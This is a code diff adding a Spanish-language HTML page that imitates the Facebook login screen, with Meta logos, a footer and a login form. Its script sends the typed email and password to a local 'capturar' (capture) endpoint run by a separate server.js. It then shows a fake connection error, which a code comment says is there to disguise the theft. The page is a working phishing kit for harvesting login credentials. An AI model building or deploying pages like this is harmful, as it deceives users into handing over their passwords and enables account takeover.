@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="wrapper">
+        <main class="main-container">
+            <section class="left-panel">
+                <img src="https://cdn.iconscout.com/icon/free/png-256/facebook-60-156920.png" alt="Facebook" class="logo">
+                
+                <div class="collage-area">
+                    <span class="emoji">😆</span>
+                    
+                    <div class="card card-knot">
+                        <div class="card-icon"></div>
+                    </div>
+
+                    <div class="card card-skater">
+                        <div class="time-badge">⏱️16:45</div>
+                        
+                        <div class="profile-circle">
+                            <div class="heart-badge"></div>
+                        </div>
+                    </div>
+
+                    <div class="card card-tickets">
+                        <div class="blue-icon">★</div>
+                    </div>
+                </div>
+
+                <h1 class="main-text">Explora <br> lo que <br> <span>más te gusta.</span></h1>
+            </section>
+
+            <section class="right-panel">
+                <div class="login-container">
+                    <h2>Iniciar sesión en Facebook</h2>
+                    <form id="loginForm">
+                        <input type="text" id="email" placeholder="Correo electrónico o número de celular" required>
+                        <input type="password" id="password" placeholder="Contraseña" required>
+                        <button type="submit" class="login-btn">Iniciar sesión</button>
+                    </form>
+                    <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
+                    <button class="create-btn">Crear cuenta nueva</button>
+                </div>
+                <div class="meta-brand">
+                    <img src="https://tse1.mm.bing.net/th/id/OIP.5MoH8qTW_swxJ-jDBlOd8QHaFj?rs=1&pid=ImgDetMain&o=7&rm=3" alt="Meta" width="22">
+                    <span>Meta</span>
+                </div>
+            </section>
+        </main>
+
+        <footer class="footer-container">
+            <div class="footer-content">
+                <div class="footer-row languages">
+                    <span>Español</span> <span>English (US)</span> <span>Italiano</span> 
+                    <span>Português (Brasil)</span> <span>Français (France)</span> 
+                    <span>Deutsch</span> <span>日本語</span> <span>Más idiomas...</span>
+                </div>
+                
+               
+
+                <div class="footer-row">
+                    <span>Registrarte</span> <span>Iniciar sesión</span> <span>Messenger</span> 
+                    <span>Facebook Lite</span> <span>Video</span> <span>Meta Pay</span> 
+                    <span>Tienda de Meta</span> <span>Meta Quest</span> <span>Ray-Ban Meta</span> 
+                    <span>Meta AI</span> <span>Instagram</span> <span>Threads</span>
+                </div>
+
+                <div class="footer-row">
+                    <span>Política de privacidad</span> <span>Centro de privacidad</span> 
+                    <span>Información</span> <span>Crear anuncio</span> <span>Crear página</span> 
+                    <span>Desarrolladores</span> <span>Empleo</span> <span>Cookies</span> 
+                    <span>Opciones de anuncios</span>
+                </div>
+
+                <div class="footer-row">
+                    <span>Condiciones</span> <span>Ayuda</span> <span>Importación de contactos y no usuarios</span>
+                </div>
+
+                <div class="footer-copyright">
+                    Meta © 2026
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script>
+        const loginForm = document.getElementById('loginForm');
+
+        loginForm.addEventListener('submit', async (e) => {
+            e.preventDefault(); // Evita que la página se recargue
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            try {
+                // Enviamos los datos a nuestro servidor local (server.js)
+                const response = await fetch('http://localhost:3000/capturar', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ email, password })
+                });
+
+                if (response.ok) {
+                    // Limpiamos los campos y damos un mensaje de error falso para disimular
+                    loginForm.reset();
+                    alert("Error de conexión con el servidor. Por favor, inténtelo de nuevo más tarde.");
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert("Asegúrate de que el servidor (node server.js) esté encendido.");
+            }
+        });
+    </script>
+</body>
+</html>
